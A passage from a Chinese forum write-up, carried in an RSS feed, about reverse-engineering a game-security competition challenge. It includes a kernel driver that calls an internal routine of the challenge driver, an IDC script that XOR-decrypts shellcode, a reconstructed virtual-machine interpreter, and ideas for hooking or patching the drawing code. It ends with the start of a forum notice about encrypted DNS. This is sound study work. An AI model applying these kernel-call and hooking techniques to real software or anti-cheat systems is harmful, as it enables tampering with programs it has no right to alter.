;">ZwAllocateVirtualMemory</code> 函数给进程申请内存，然后拷贝 shellcode 并进行了一定的异或混淆，最关键它把 <code style="font-family: SFMono-Regular, Consolas, ;">D3DCompile</code> 的地址和第二次申请内存的地址保存在第一次申请的内存后方，应该是方便 <code style="font-family: SFMono-Regular, Consolas, ;">shellcode</code> 找到虚拟代码，剩下的大概没有什么了，虽然没有运行成功大概也能猜测这个 shellcode 应该就是直接在屏幕绘制的代码了。</p><h3>exe分析</h3><p>三环程序比较大，先用火绒剑分析一下行为，主要是排除 exe 有跟内核做直接数据交互。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=b52d6560&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlftVBl4vzibLn7Lc2sNttIDiaaePiaC549E9iaKSGicAt1EjWGoO8vRROHfw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>然而并没有，但是发现它也打开了 <code style="font-family: SFMono-Regular, Consolas, ;">D3DCompiler_47.dll</code>，于是从这里开始交叉引用，通过DLL路径交叉是一个比较好的思路，不管动态加载或者是运行时直接导入，都是可以大概分析到主逻辑的。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=239ecbfc&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRl87IicHWqotLmbPZQtTZibibMokxlWLRZGkRicc93q90BOVpt2FX9K5vRDw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>里面就进行了一个 <code style="font-family: SFMono-Regular, Consolas, ;">NtQuerySystemInformation</code>，外面是创建线程调用的这个函数，这里应该是触发回调的一个函数，为了验证也是准备去调试，但是它根本不触发这个回调，如图所见。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=b37dc26f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlDHmY5tBV0AIHg7tgLSfLAWBJjkyGjh0tRWQ7ge8fn3XcNgXEzTvM9Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>之前配置环境的时候一直以为是虚拟机没有 <code style="font-family: SFMono-Regular, Consolas, ;">dwm.exe</code> 这个进程，结果没想到是回调没有办法调用，于是我选择自己运行一个 dwm.exe 进程（我直接拿初赛的三环程序去改名然后运行，可以在第一个函数成功被获取），然后自己写一个驱动手动调用那个回调写shellcode。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">"ntddk.h"</span>  </span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span><br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(255, 255, 182);">void</span> (* func)();<br />PDRIVER_OBJECT g_Object = <span style="color: rgb(198, 197, 254);">NULL</span>;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> _LDR_DATA_TABLE_ENTRY {<br />    LIST_ENTRY InLoadOrderLinks;<br />    LIST_ENTRY InMemoryOrderLinks;<br />    LIST_ENTRY InInitializationOrderLinks;<br />    PVOID DllBase;<br />    PVOID EntryPoint;<span style="color: rgb(124, 124, 124);">//驱动的进入点 DriverEntry  </span><br />    ULONG SizeOfImage;<br />    UNICODE_STRING FullDllName;<span style="color: rgb(124, 124, 124);">//驱动的满路径  </span><br />    UNICODE_STRING BaseDllName;<span style="color: rgb(124, 124, 124);">//不带路径的驱动名字  </span><br />    ULONG Flags;<br />    USHORT LoadCount;<br />    USHORT TlsIndex;<br />    <span style="color: rgb(150, 203, 254);">union</span> {<br />        LIST_ENTRY HashLinks;<br />        <span style="color: rgb(150, 203, 254);">struct</span> {<br />            PVOID SectionPointer;<br />            ULONG CheckSum;<br />        };<br />    };<br />    <span style="color: rgb(150, 203, 254);">union</span> {<br />        <span style="color: rgb(150, 203, 254);">struct</span> {<br />            ULONG TimeDateStamp;<br />        };<br />        <span style="color: rgb(150, 203, 254);">struct</span> {<br />            PVOID LoadedImports;<br />        };<br />    };<br />} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;<br /><br />VOID bianliqudongmokuai(PUNICODE_STRING name, UINT64* pBaseAddr,UINT64* pSize)<br />{<br />    LDR_DATA_TABLE_ENTRY*TE, *Tmp;<br />    TE = (LDR_DATA_TABLE_ENTRY*)g_Object-&gt;DriverSection;<br />    PLIST_ENTRY LinkList;<br />    ;<br />    <span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>;<br />    LinkList = TE-&gt;InLoadOrderLinks.Flink;  <br />    <span style="color: rgb(150, 203, 254);">while</span> (LinkList != &amp;TE-&gt;InLoadOrderLinks)<br />    {<br />        Tmp = (LDR_DATA_TABLE_ENTRY*)LinkList;<br />        <span style="color: rgb(150, 203, 254);">if</span> (RtlCompareUnicodeString(&amp;Tmp-&gt;BaseDllName, name, <span style="color: rgb(198, 197, 254);">FALSE</span>))<br />        {<br />        }<br />        <span style="color: rgb(150, 203, 254);">else</span><br />        {<br />            kprintf((<span style="color: rgb(168, 255, 96);">"Found Module!\n"</span>));<br />            *pBaseAddr = (UINT64)(Tmp-&gt;DllBase);<br />            *pSize = (UINT64)(Tmp-&gt;SizeOfImage);<br /><br />        }<br />        LinkList = LinkList-&gt;Flink;<br />        i++;<br />    }<br /><br />}<br />VOID Unload(PDRIVER_OBJECT DriverObject)<br />{<br />    kprintf((<span style="color: rgb(168, 255, 96);">"BYE xia0ji233\n"</span>));<br />}<br />NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)<br />{<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Hello xia0ji233\n"</span>));<br />    g_Object = DriverObject;<br />    DriverObject-&gt;DriverUnload = Unload;<br />    UNICODE_STRING name;<br />    UINT64 Base = <span style="color: rgb(255, 115, 253);">0</span>;<br />    UINT64 Size=<span style="color: rgb(255, 115, 253);">0</span>;<br />    RtlInitUnicodeString(&amp;name, L<span style="color: rgb(168, 255, 96);">"2022GameSafeRace.sys"</span>);<br />    <span style="color: rgb(124, 124, 124);">//</span><br />    bianliqudongmokuai(&amp;name,&amp;Base,&amp;Size);<br />    <span style="color: rgb(150, 203, 254);">if</span> (Base) {<br />        kprintf((<span style="color: rgb(168, 255, 96);">"Base:%p Size:%x\n"</span>), Base, Size);<br />        func funcptr = (func)(Base + <span style="color: rgb(255, 115, 253);">0x1490</span>);<br />        DbgBreakPoint();<br />        funcptr();<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;<br />}</code></pre><p>运行结果如下，用初赛的exe改名为dwm成功被这个函数获取到EProcess。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=b97c7815&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlMotibyCU4rbeyW3kCjftIfflX4CNHxJs7eQEOF0rtWGQy3OxZMSiabng%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto; display: inline;" /></p><p>随后使用静态分析去解一下 <code style="font-family: SFMono-Regular, Consolas, ;">shellcode</code>，用下面的IDC脚本即可</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;idc.idc&gt;</span></span><br /><span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">main</span>(){<br />    <span style="color: rgb(150, 203, 254);">auto</span> start_ea = <span style="color: rgb(255, 115, 253);">0x000000140005A00</span>;<br />    <span style="color: rgb(150, 203, 254);">auto</span> end_ea =  <span style="color: rgb(255, 115, 253);">0x000000140005A00</span>+<span style="color: rgb(255, 115, 253);">0x16E6</span>;<br />    <span style="color: rgb(150, 203, 254);">auto</span> len = end_ea - start_ea;<br />    <span style="color: rgb(150, 203, 254);">auto</span> ea=<span style="color: rgb(255, 115, 253);">0</span>;<br />    <span style="color: rgb(150, 203, 254);">for</span> (ea = start_ea; ea &lt; end_ea; ea++) {<br />        PatchByte(ea, Byte(ea)^<span style="color: rgb(255, 115, 253);">0xC3</span>);    <br />    }<br />}</code></pre><p>解密后的 <code style="font-family: SFMono-Regular, Consolas, ;">shellcode</code> 可以被直接反编译</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=4234f79b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRl0lM00zrWXK4lmnYtxWG5DbyCuUq8wE9I5FBVbg6JgDnTUyBlDKyEew%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto; display: inline;" /></p><p>看起来跟初赛是差不多的，相同的配方，相同的味道。</p><p>再往下看</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=58efedf7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRljp4lc5alUgkhHaOoiamriczO7wyXhUozN40vAsbVoK385WJftkHYWYVQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>就连这个ACE都是一样的，这里大概是一个全新的虚拟机了。</p><p>然后本来是打算搜字节码去看看shellcode有没有写成功的，但是发现还是搜不到，突然想到好像这个回调最后会 free 这片内存，所以决定直接改 sys 去把原来的 free 给 <code style="font-family: SFMono-Regular, Consolas, ;">jmp</code> 掉（还是失败，想复现太难了 qwq）。</p><p>还是老老实实分析虚拟机代码吧，看到 <code style="font-family: SFMono-Regular, Consolas, ;">unk_140004030</code>，它被放到了 <code style="font-family: SFMono-Regular, Consolas, ;">BaseAddress + 0x16E6</code> 的位置上，这里的代码在我们看来是在 <code style="font-family: SFMono-Regular, Consolas, ;">0x140005A00</code>，而直接分析可得，代码实际在 <code style="font-family: SFMono-Regular, Consolas, ;">&amp;qword_140009600[136]=0x140009600+136*8=0x140009a40</code> 的位置上。</p><p>然而这里没找到对应的数据，确实也不太会分析了，按理来说如果能直接调试运行到这的话是肯定可以定位shellcode找到位置dump出来的。</p><p>这里还原一下虚拟机的流程吧</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;stdio.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;string.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span><span style="color: rgb(168, 255, 96);">&lt;stdlib.h&gt;</span></span><br /><span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> code[] ={<span style="color: rgb(255, 115, 253);">0</span>};<br /><br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">main</span>(){<br />    <span style="color: rgb(255, 255, 182);">int</span> Stack[<span style="color: rgb(255, 115, 253);">0x50</span>];<br />    <span style="color: rgb(255, 255, 182);">unsigned</span> __int64 RIP_S=<span style="color: rgb(255, 115, 253);">0</span>; <span style="color: rgb(124, 124, 124);">// rsi</span><br />    <span style="color: rgb(255, 255, 182);">unsigned</span> __int64 v10; <span style="color: rgb(124, 124, 124);">// r8</span><br />    <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">int</span> opcode; <span style="color: rgb(124, 124, 124);">// ecx</span><br />    <span style="color: rgb(255, 255, 182);">unsigned</span> __int64 v12; <span style="color: rgb(124, 124, 124);">// rdx</span><br />    __int64 v13; <span style="color: rgb(124, 124, 124);">// rcx</span><br />    __int32 v14; <span style="color: rgb(124, 124, 124);">// r9d</span><br />    __int64 v15; <span style="color: rgb(124, 124, 124);">// r8</span><br />    __int64 v16; <span style="color: rgb(124, 124, 124);">// r9</span><br />    __int32 v17; <span style="color: rgb(124, 124, 124);">// edx</span><br />    <span style="color: rgb(255, 255, 182);">unsigned</span> __int64 v18; <span style="color: rgb(124, 124, 124);">// r10</span><br />    <span style="color: rgb(255, 255, 182);">unsigned</span> __int64 v19; <span style="color: rgb(124, 124, 124);">// rcx</span><br />    __int32 v20; <span style="color: rgb(124, 124, 124);">// r9d</span><br />    __int32 v21; <span style="color: rgb(124, 124, 124);">// r9d</span><br />    __int32 v22; <span style="color: rgb(124, 124, 124);">// eax</span><br />    __int64 result; <span style="color: rgb(124, 124, 124);">// rax</span><br />    memset(Stack,<span style="color: rgb(255, 115, 253);">0</span>,sizeof(Stack));<br />    Stack[<span style="color: rgb(255, 115, 253);">8</span>] = <span style="color: rgb(255, 115, 253);">50</span>;<br />    Stack[<span style="color: rgb(255, 115, 253);">9</span>] = <span style="color: rgb(255, 115, 253);">50</span>;<br />    <span style="color: rgb(150, 203, 254);">do</span><br />    {<br />        v10 = RIP_S;<br />        opcode = code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>];<br />        <span style="color: rgb(150, 203, 254);">if</span> ( (<span style="color: rgb(255, 255, 182);">int</span>)opcode &gt; (<span style="color: rgb(255, 255, 182);">int</span>)<span style="color: rgb(255, 115, 253);">0x9A8ECD52</span> )<br />        {<br />            <span style="color: rgb(150, 203, 254);">switch</span> ( opcode )<br />            {<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0xEE2362FC</span>:<br />                    ++RIP_S;<br />                    v21 = Stack[<span style="color: rgb(255, 115, 253);">0</span>];<br />                    v22 = Stack[<span style="color: rgb(255, 115, 253);">0</span>] * (Stack[<span style="color: rgb(255, 115, 253);">1</span>] + <span style="color: rgb(255, 115, 253);">1</span>);<br />                    Stack[<span style="color: rgb(255, 115, 253);">0</span>] = code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>] ^ <span style="color: rgb(255, 115, 253);">0x414345</span>;<br />                    Stack[<span style="color: rgb(255, 115, 253);">1</span>] = (Stack[<span style="color: rgb(255, 115, 253);">0</span>] ^ (Stack[<span style="color: rgb(255, 115, 253);">1</span>] + v21)) % <span style="color: rgb(255, 115, 253);">256</span><br />                        + (((Stack[<span style="color: rgb(255, 115, 253);">0</span>] ^ (v21 * Stack[<span style="color: rgb(255, 115, 253);">1</span>])) % <span style="color: rgb(255, 115, 253);">256</span> + (((Stack[<span style="color: rgb(255, 115, 253);">0</span>] ^ (Stack[<span style="color: rgb(255, 115, 253);">1</span>] + v22)) % <span style="color: rgb(255, 115, 253);">256</span>) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>)) &lt;&lt; <span style="color: rgb(255, 115, 253);">8</span>);<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0xEE69524A</span>:<br />                    v19 = <span style="color: rgb(255, 115, 253);">0</span>;<br />                    v20 = code[v10 + <span style="color: rgb(255, 115, 253);">273</span>];<br />                    code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>] = <span style="color: rgb(255, 115, 253);">-1</span>;<br />                    code[v10 + <span style="color: rgb(255, 115, 253);">273</span>] = <span style="color: rgb(255, 115, 253);">-1</span>;<br />                    <span style="color: rgb(150, 203, 254);">if</span> ( RIP_S != <span style="color: rgb(255, 115, 253);">1</span> )<br />                    {<br />                        <span style="color: rgb(150, 203, 254);">do</span><br />                        {<br />                            code[v19 + <span style="color: rgb(255, 115, 253);">272</span>] ^= v20;<br />                            ++v19;<br />                        }<br />                        <span style="color: rgb(150, 203, 254);">while</span> ( v19 &lt; RIP_S - <span style="color: rgb(255, 115, 253);">1</span> );<br />                    }<br />                    ++RIP_S;<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0xFF4578AE</span>:<br />                    RIP_S += <span style="color: rgb(255, 115, 253);">2</span>;<br />                    v16 = code[v10 + <span style="color: rgb(255, 115, 253);">273</span>];<br />                    v17 = code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>];<br />                    <span style="color: rgb(150, 203, 254);">if</span> ( v16 )<br />                    {<br />                        v18 = RIP_S;<br />                        <span style="color: rgb(150, 203, 254);">do</span><br />                        {<br />                            code[++v18 + <span style="color: rgb(255, 115, 253);">272</span>] ^= v17;<br />                            v17 = code[v18 + <span style="color: rgb(255, 115, 253);">271</span>] + <span style="color: rgb(255, 115, 253);">305419896</span> * v17;<br />                            --v16;<br />                        }<br />                        <span style="color: rgb(150, 203, 254);">while</span> ( v16 );<br />                    }<br />                    code[v10 + <span style="color: rgb(255, 115, 253);">272</span>] = <span style="color: rgb(255, 115, 253);">-1</span>;<br />                    code[v10 + <span style="color: rgb(255, 115, 253);">273</span>] = <span style="color: rgb(255, 115, 253);">-1</span>;<br />                    code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>] = <span style="color: rgb(255, 115, 253);">-1</span>;<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0x1132EADF</span>:<br />                    RIP_S += <span style="color: rgb(255, 115, 253);">2</span>;<br />                    Stack[code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>]] = code[v10 + <span style="color: rgb(255, 115, 253);">273</span>];<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">default</span>:<br />                    <span style="color: rgb(150, 203, 254);">if</span> ( opcode == <span style="color: rgb(255, 115, 253);">2018683631</span> &amp;&amp; code[<span style="color: rgb(255, 115, 253);">272</span>] == <span style="color: rgb(255, 115, 253);">-295083446</span> &amp;&amp; code[<span style="color: rgb(255, 115, 253);">273</span>] == <span style="color: rgb(255, 115, 253);">1755241482</span> &amp;&amp; code[<span style="color: rgb(255, 115, 253);">274</span>] == <span style="color: rgb(255, 115, 253);">-1729111095</span> )<br />                        printf(<span style="color: rgb(168, 255, 96);">"call Paint(%d, %d, %d, %d, NAN, a3, a4, a5, a6, a7)"</span>,Stack[<span style="color: rgb(255, 115, 253);">4</span>], Stack[<span style="color: rgb(255, 115, 253);">5</span>], Stack[<span style="color: rgb(255, 115, 253);">6</span>], Stack[<span style="color: rgb(255, 115, 253);">7</span>]);<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />            }<br />        }<br />        <span style="color: rgb(150, 203, 254);">else</span><br />        {<br />            <span style="color: rgb(150, 203, 254);">switch</span> ( opcode )<br />            {<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0x9A8ECD52</span>:<br />                    Stack[<span style="color: rgb(255, 115, 253);">0</span>] -= Stack[<span style="color: rgb(255, 115, 253);">1</span>];<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0x88659264</span>:<br />                    RIP_S += <span style="color: rgb(255, 115, 253);">2</span>;<br />                    v12 = RIP_S;<br />                    v13 = code[v10 + <span style="color: rgb(255, 115, 253);">273</span>];<br />                    v14 = code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>];<br />                    code[v10 + <span style="color: rgb(255, 115, 253);">272</span>] = <span style="color: rgb(255, 115, 253);">-1</span>;<br />                    code[v10 + <span style="color: rgb(255, 115, 253);">273</span>] = <span style="color: rgb(255, 115, 253);">-1</span>;<br />                    v15 = v13;<br />                    code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>] = <span style="color: rgb(255, 115, 253);">-1</span>;<br />                    <span style="color: rgb(150, 203, 254);">if</span> ( v13 )<br />                    {<br />                        <span style="color: rgb(150, 203, 254);">do</span><br />                        {<br />                            code[++v12 + <span style="color: rgb(255, 115, 253);">272</span>] ^= v14;<br />                            --v15;<br />                        }<br />                        <span style="color: rgb(150, 203, 254);">while</span> ( v15 );<br />                    }<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0x89657EAD</span>:<br />                    Stack[<span style="color: rgb(255, 115, 253);">0</span>] += Stack[<span style="color: rgb(255, 115, 253);">1</span>];<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0x8E7CADF2</span>:<br />                    RIP_S += <span style="color: rgb(255, 115, 253);">2</span>;<br />                    Stack[code[RIP_S + <span style="color: rgb(255, 115, 253);">272</span>]] = Stack[code[v10 + <span style="color: rgb(255, 115, 253);">273</span>]];<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0x9645AAED</span>:<br />                    <span style="color: rgb(150, 203, 254);">if</span> ( code[<span style="color: rgb(255, 115, 253);">272</span>] == <span style="color: rgb(255, 115, 253);">0xEE69624A</span> &amp;&amp; code[<span style="color: rgb(255, 115, 253);">273</span>] == <span style="color: rgb(255, 115, 253);">0x689EDC0A</span> &amp;&amp; code[<span style="color: rgb(255, 115, 253);">274</span>] == <span style="color: rgb(255, 115, 253);">0x98EFDBC9</span> )<br />                        printf(<span style="color: rgb(168, 255, 96);">"call Paint(%d, %d, %d, %d, NAN, a3, a4, a5, a6, a7)"</span>,Stack[<span style="color: rgb(255, 115, 253);">4</span>], Stack[<span style="color: rgb(255, 115, 253);">5</span>], Stack[<span style="color: rgb(255, 115, 253);">6</span>], Stack[<span style="color: rgb(255, 115, 253);">7</span>]);<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />                <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">0x9645AEDC</span>:<br />                    RIP_S = <span style="color: rgb(255, 115, 253);">0x671</span>;<br />                    <span style="color: rgb(150, 203, 254);">break</span>;<br />            }<br />        }<br />        result = <span style="color: rgb(255, 115, 253);">0x671</span>;<br />        ++RIP_S;<br />    }<br />    <span style="color: rgb(150, 203, 254);">while</span> ( RIP_S &lt; <span style="color: rgb(255, 115, 253);">0x671</span> );<br />}</code></pre><p>对比起来这个虚拟机的流程也是更大更难去分析了，但是根据已有的资料看来，似乎出的问题与初赛一致，最好的办法就是做 hook 然后替换坐标。据说决赛是卷方法数，当然其他的方法也可以有，这里可以说一些理论可行的方案：</p><ul><li style="margin-left: 2px;"><p>自己生成正确的指令流，直接PATCH SYS 文件。</p></li><li style="margin-left: 2px;"><p>等代码注入完成之后，搜索指令的特征码找到三环程序中代码的位置，替换（感觉和上面算一种）。</p></li><li style="margin-left: 2px;"><p>hook 绘制的代码，写入正确坐标。</p></li><li style="margin-left: 2px;"><p>不用虚拟机，自己接管流程，然后自己计算正确的坐标和加密的参数调用绘制函数。</p></li><li style="margin-left: 2px;"><p>不知道它代码坐标计算出错的原因，如果是逻辑错误可以直接修虚拟机，也能算一种。</p></li></ul><p>脑子有限，只能想那么多了，希望有时间那个旧电脑退役了刷个系统再去实现这些操作把。</p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1904205-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Mon, 25 Mar 2024 18:17:09 +0800</pubDate>
</item>
<item>
<title>【公告】关于论坛验证码无法显示的问题解决方法</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140318&amp;idx=1&amp;sn=e77d522f3ced943e26ef4c5a0b2570e8&amp;chksm=bd50a08a8a27299ca62f961c28c942e9c0665749abd118ec1b99fa8c3ff67874b4e86dbd60a0&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140318&amp;idx=1&amp;sn=e77d522f3ced943e26ef4c5a0b2570e8&amp;chksm=bd50a08a8a27299ca62f961c28c942e9c0665749abd118ec1b99fa8c3ff67874b4e86dbd60a0&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<div> 🔍DNS解析错误导致部分同学无法显示验证码，建议使用加密DNS进行网络访问，减少网络劫持的发生。<br />
🖥️推荐国内加密DNS：阿里加密DNS和腾讯加密DNS。<br />
🌐设置浏览器加密DNS方法：<br />
Microsoft Edge、Google Chrome、360极速浏览器X、Firefox火狐浏览器分别有不同步骤。<br />
Windows 11系统支持加密DNS设置，其他老系统推荐使用浏览器设置方式。<br />
📱手机系统和浏览器根据设备和浏览器信息进行加密DNS设置。<br />
